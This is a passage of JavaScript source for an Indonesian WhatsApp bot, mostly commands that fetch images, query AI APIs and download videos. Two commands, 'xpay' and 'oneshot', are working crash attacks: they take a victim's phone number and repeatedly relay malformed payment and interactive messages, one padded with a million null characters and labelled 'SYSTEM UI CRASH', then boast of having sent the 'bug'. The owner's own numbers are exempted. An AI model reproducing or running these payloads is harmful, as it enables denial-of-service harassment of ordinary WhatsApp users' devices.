if (user.registered === false) return reply(mess.notregist);
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
                let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
                let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
    break
    case 'ai2':
case 'openai2': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
	if (!text) return reply(`Example : ${prefix + command} what is your name`);   
        try {
            reply(mess.wait)
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./lib/database/image/Ayano.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ptz.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
		case 'openai': case 'ai':
         if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
if (!text) return reply (`mau nanya apa?`) 
fetch(`https://skizoasia.xyz/api/openai?apikey=${API.SKIZO}&text=${text}`,)
.then((result) => result.json())
.then((x) => reply(x.result));
        reply('_🚩 5 Limit Terpakai!!.._')
break
    case 'autodownload': case 'autodl':
    let qq = m.quoted ? m.quoted : m
if (!isCreator) return reply('khusus owner')
                
                if (args[0] == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    reply(`Successfully Changed Auto Download To ${text}`)
                } else if (args[0] == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    reply(`Successfully Changed Auto Download To ${text}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./lib/database/image/Ayano.jpg')}, { upload: ptz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363310531380313@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
    case'twt': case 'twitterdl':
case 'twitter': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
 function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Linknya mana, bro..');
try {
 reply(mess.wait);
const response = await fetch(`https://skizo.tech/api/twitter?apikey=woxxzAsia&url=${encodeURIComponent(text)}`);
const data = await response.json();
for (let ii = 0; ii < data.media.length; ii++) {
 const caption = ii === 0 ? data.authorName : '';
 const url = data.media[ii].url;
 const type = data.media[ii].type.includes('video') ? 'video' : 'image';
 await ptz.sendMessage(m.chat, {
 [type]: {
 url: url,
 },
 caption,
 }, {
 quoted: m,
 });
 await delay(1500);
}
} catch (e) {
 console.error(e);
 reply('Server error!');
 return e.toString();
}
}
break
    
case 'hd2':
    let konn = global.db.data.users[m.sender]
if (konn.registered === false) return reply(mess.notregist);
  //if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hd*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hd*`)
  let mediaa = await ptz.downloadAndSaveMediaMessage(quoted);
  //const shannzCdn = require('./lib/shanzzCdn')
  let shz = await shannzCdn(mediaa);
  let cdn = shz.result
  let proses = await (await fetch('https://api.shannmoderz.xyz/tools/enhace?url=' + cdn)).json();
  let imge = proses.result.data;
  ptz.sendMessage(m.chat, { image: { url: imge.downloadUrls[0] }, caption: '*SUCCESS ✅*'}, { quoted: m})
break
    case 'scbot': case "script": 
case "scriptbot": {

if (isPrem) {
m.reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `project⚡`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await ptz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script kapaldev*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*`

ptz.relayMessage(m.chat, {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 10000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case 'antibot': {

//if (!isCreator) return reply(mess.owner)
if (!isAdmins) return reply('bot harus menjadi *admin*')
if (!m.isGroup) return reply(mess.group)
if (args[0] === "on") {
if (antibotz) return reply('Sukses Mengaktifikan Tuan✅')
antibott.push(m.chat)
fs.writeFileSync(`./antibot.json`, JSON.stringify(antibott))
reply('Success in turning on antibot in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTolong jika ada bot ada disini mohon di self atau mute jika ada bot maka antibot akan kena kick`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antibotz) return reply('Sukses Menonaktifkan Tuan✅')
let off = antibott.indexOf(m.chat)
antibott.splice(off, 1)
fs.writeFileSync('./antibot.json', JSON.stringify(antibott))
reply('`Success in turning off antibot in this group`')
} else {
 await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }

 break
case 'bingimg': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return reply('*contoh:* .bingimg kucing imut')
	reply(mess.wait)
  let ini = await fetchJson(`https://widipe.com/bingimg?text=${text}`);
for (let bing of ini.result) {
await sleep(500)
await ptz.sendMessage(m.chat, { image: { url: bing }, caption: `*Hasil Dari*: ${text}`}, {quoted: m})
}
}
break

/*_Fitur Untuk Botz wa' yang paham aja_
*`Akan Muncul'4 Gambar`*

- *[ Sumber info aja ]*
https://whatsapp.com/channel/0029Vaip0EG72WTuTkQRms0e*/
case 'menub': {
/*let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: menunye,
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '',
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./Thum.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
                {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Free Update Bot\",\"url\":\"https://www.youtube.com/@Dichcreator\",\"merchant_url\":\"https://www.youtube.com/@Dichcreator\"}"
 },],
          }
                                                                                      ),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: '[ Projects Everdad ]' }}}); 
await ptz.relayMessage(m.chat, msgs.message, {})*/
	ptz.relayMessage(m.chat, {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 65000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: menunye, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
    }
break
//*[ Feature tiktok search button type case ]*

case  'ttsearch2': {
   if (!text) return reply(`*[ ! ]* *Command Anda Salah*\n*Example ${prefix + command} Resah Jadi Luka*`)
    await ptz.sendMessage(m.chat, {
        react: {
            text: "🕒",
            key: m.key,
        }
    })
    await ptz.sendMessage(m.chat, {
        react: {
            text: "☑️",
            key: m.key,
        }
    })
    let res2 = await fetch(`https://api.shannmoderz.xyz/search/tiktok?query=${text}`)
    let spas = "              "
    let gfris = "`"
    let data = await res2.json()
    let ress = await tiktok(text)
    //let json = data[Math.floor(Math.random() * data.length)]
    let result = data.result
    let cap = `*『 ᴛ ɪ ᴋ ᴛ ᴏ ᴋ - s ᴇ ᴀ ʀ ᴄ ʜ 』*

*Title* \n${result.title}\n\nVideo nya, untuk yg lain silahkan klik next`

    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: cap,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname,
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                   ...(await prepareWAMessageMedia({ video: {url:result.no_watermark}}, 
                  { upload:ptz.waUploadToServer})),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                    }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Next 🎬\",\"id\":\"${prefix + command} ${text}\"}`
                        }],

                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 99,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "",
                            newsletterName: `『 ${text} 』`,
                           serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {
        quoted: m
    })
    ptz.sendMessage(m.chat, {audio: {url: result.no_watermark },mimetype: 'audio/mp4'},{quoted:m})
    return await ptz.relayMessage(m.chat, msgs.message, {})
}
break
/* Case Tele TTSEARCH /*

SUMBER : 
https://whatsapp.com/channel/0029VaD82kP7j6g6RZTdb12h*/

case 'ttsearch': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}
  if (!text) return reply(`• Example : .${command} separuh aku`)
  let yoiii = await tiktoks(`${text}`)
  await /*rioo.replyWithVideo({
            url: yoiii.no_watermark,
            },{
            caption: '```Result from:```'+' `'+text+`'`+'``Done Ya```'
        })*/
  ptz.sendMessage(m.chat, { video: { url: yoiii.no_watermark }, caption: `*Hasil Dari*: ${text}` }, { quoted: m });
}
break
case 'sendadzn':
case 'sendadzan':
/*ptz.sendMessage(m.chat, {audio: {url: fs.readFileSync(`./database/base/audio/adzan.mp3`)},mimetype: 'audio/mp4'},{quoted:m})*/
let kntll = fs.readFileSync('./database/base/audio/adzan.mp3')
    ptz.sendMessage(m.chat, { audio: kntll, mimetype: "audio/mp4", ptt: true }, { quoted: m })
break
case 'hdvid':
case 'hdvidio':
case 'hdvideo': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!/video/.test(mime)) {
return m.reply(`Kirim/kutip video dengan caption ${prefix+command}`)
}
await ptz.sendMessage(m.chat, { react: { text: "🔎", key: m.key } });

let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
return new Promise((resolve, reject) => {
const outputStream = new stream.PassThrough();
ffmpeg()
.input(stream.Readable.from(inputBuffer))
.videoFilter('eq=contrast=1.2:brightness=0.1') 
.outputFormat('mp4') 
.pipe(outputStream, { end: true });
const chunks = [];
outputStream.on('data', chunk => chunks.push(chunk));
outputStream.on('end', () => resolve(Buffer.concat(chunks)));
outputStream.on('error', reject);
});
}
try {
let processedVideo = await enhanceVideo(media);
await ptz.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses' }, { quoted: m });
} catch (error) {
console.error('Error:', error);
m.reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}}
break
case 'afk': {
//if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
case 'npmstalk': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
  if (!text) return reply("Example: .npmstalk axios")
async function npmstalk(packageName) {
  let stalk = await axios.get("https://registry.npmjs.org/"+packageName)
  let versions = stalk.data.versions
  let allver = Object.keys(versions)
  let verLatest = allver[allver.length-1]
  let verPublish = allver[0]
  let packageLatest = versions[verLatest]
  return {
    name: packageName,
    versionLatest: verLatest,
    versionPublish: verPublish,
    versionUpdate: allver.length,
    latestDependencies: Object.keys(packageLatest.dependencies).length,
    publishDependencies: Object.keys(versions[verPublish].dependencies).length,
    publishTime: stalk.data.time.created,
    latestPublishTime: stalk.data.time[verLatest]
  }
}
try {
let jut = await npmstalk(text)
let ahwoi = `[ *NPM STALK* ]

Name: ${jut.name}
Version Latest: ${jut.versionLatest}
Version Publish: ${jut.versionPublish}
Version Update: ${jut.versionUpdate}
Latest Dependencies: ${jut.latestDependencies}
Publish Dependencies: ${jut.publishDependencies}
Publish Time: ${jut.publishTime}
Latest Publish Time: ${jut.latestPublishTime}
`
ptz.sendMessage(m.chat, {text: ahwoi}, {quoted: m})
} catch (error) {
  m.reply(error.message)
}
}
break
//pervobaan 
case 'tytmp3':
case 'youtubemp3':
case 'youtubeaudio':{
if(!text) return reply(`Contoh : ${prefix+command} Link`)
await reply(mess.wait)
downloadMp3(text)
}
break
//=================================================//
case 'tytmp4':
case 'youtubevideo':
case 'youtubemp4':{
if(!text) return reply(`Contoh : ${prefix+command} Link`)
await reply(mess.wait)
downloadMp4(text)
}
break
case 'xpay': case 'xpayment': {
					if (!isCreator) return m.reply('Fitur Khusus Member Premium')
if (!text) return m.reply(`Usage .${command} 916909137213`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return m.reply(`Example : ${prefix+command} 916909137213`)
var contactInfo = await ptz.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
 if (cleanedNumber == "6285224079032") {
 return;
 }
 if (cleanedNumber == "6287826292008") {
 return;
 }
 if (cleanedNumber == "62895375577040") {
 return;
 }
 if (contactInfo.length == 0) {
 return m.reply("The number is not registered on WhatsApp");
 }
reply(mess.bugrespon)
 async function xeonBugPay(jid){
				await ptz.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
 sendMessageWithMentions(
 "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
 " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
 [whatsappNumber]
 );
reply('`Sukses To Send Bug For target`')
				}
				break
case 'oneshot': {
	if (!isPrem) return reply(mess.owner)
if (!text) return reply(`Usage .${command} 916909137213`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return reply(`Example : ${prefix+command} 916909137213`)
var contactInfo = await ptz.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
    }
    if (cleanedNumber == "6281246667086") {
    return;
    }
    if (cleanedNumber == "6287826292008") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await ptz.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🦄드림 가이 Xeon',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '🦄드림 가이 Xeon  🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
								title: '🦄드림 가이 Xeon',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await ptz.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Xeon","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await ptz.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await reply(`In process....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
            }
            
				break;
case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Kirim Nominal trx')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
ptz.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${m.sender.split('@')[0]}`, mentions: [m.sender]}, { quoted: m })
        }
        break
case 'delsesi': case 'deletesession': case 'delsession': {
				//f (!isCreator) return m.reply(mess.owner)
				fs.readdir('./session', async function (err, files) {
					if (err) {
						console.log('Unable to scan directory: ' + err);
						return m.reply('Unable to scan directory: ' + err);
					}
					let filteredArray = await files.filter(item => item.startsWith('pre-key') || item.startsWith('sender-key') || item.startsWith('session-'));
					let teks = `Terdeteksi ${filteredArray.length} Session file\n\n`
					if(filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function(e, i) {
						teks += (i+1)+`. ${e}\n`
					})
					if (text && text == 'true') {
					const { key } = await ptz.sendMessage(m.chat, { text: "Menghapus Session File.." }, { quoted: m })
						await filteredArray.forEach(function (file) {
							fs.unlinkSync('./session/' + file)
						});
						sleep(2000)
						await ptz.sendMessage(m.chat, { text: "Berhasil Menghapus Semua Sampah Session", edit: key }, { quoted: m })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`)
				});
			}
break
case 'videy' : {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!args[0]) {
 return m.reply(`• Contoh: ${prefix + command} https://videy.co/v?id=K7wdQnbm`);
}
async function videy(url) {
return new Promise(async (resolve, reject) => {
try {
const res = await axios(`${url}`, { method: 'get' });
const $ = cheerio.load(res.data);
const video = $('source[type="video/mp4"]').attr('src');
if (video) {
resolve(video);
} else {
throw new Error('Video source not found');
}
} catch (error) {
reject(`Error while fetching the URL: ${error.message}`);
h}
});
}
if (!/^http(s):\/\/videy\.co/i.test(args[0])) {
 return m.reply('Link Invalid');
}

try {
 let result = await videy(args[0]);
 await ptz.sendMessage(m.chat, { video: { url: result }, caption: "Done" }, { quoted: m });
} catch (error) {
 console.log(error);
 throw new Error(error);
}
}
break
/**
 * 
 * [ *CASE AI VOICE* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'kurumi': {
//wm hann
  if (!text) return m.reply(`Hai, apa yang kamu hari ini?`)
async function generateVoice(Query) {
    const formData = new FormData();
    formData.append("locale", 'id-ID');
    formData.append("content", `<voice name="ja-JP-AoiNeural">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
//wm hann
const sendToGemini = async (prompt) => {
